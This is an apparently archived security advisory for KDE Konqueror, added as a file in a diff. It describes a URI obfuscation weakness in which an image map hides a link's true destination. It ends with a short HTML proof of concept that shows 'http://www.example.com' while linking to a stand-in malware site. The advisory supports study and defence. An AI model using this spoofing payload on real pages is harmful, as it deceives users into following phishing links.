@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/10383/info
+
+It is reported that KDE Konqueror is prone to a URI obfuscation weakness that may hide the true contents of a URI link. The issue occurs when an image is contained within a properly formatted HREF tag.
+
+This weakness could be employed to trick a user into following a malicious link.
+
+An attacker can exploit this issue by supplying a malicious image that appears to be a URI link pointing to a page designed to mimic that of a trusted site. If an unsuspecting victim is to mouseover the link in an attempt to verify the authenticity of where it references, they may be deceived into believing that the link references the actual trusted site. 
+
+<A HREF=http://www.example.com alt="http://www.example.com">
+<IMG SRC="malware.gif" USEMAP="#malware" border=0
+alt="http://www.example.com"></A>
+<map NAME="malware" alt="http://www.example.com">
+<area SHAPE=RECT COORDS="224,21" HREF="http://www.malware.com"
+alt="http://www.example.com">
+</MAP> 
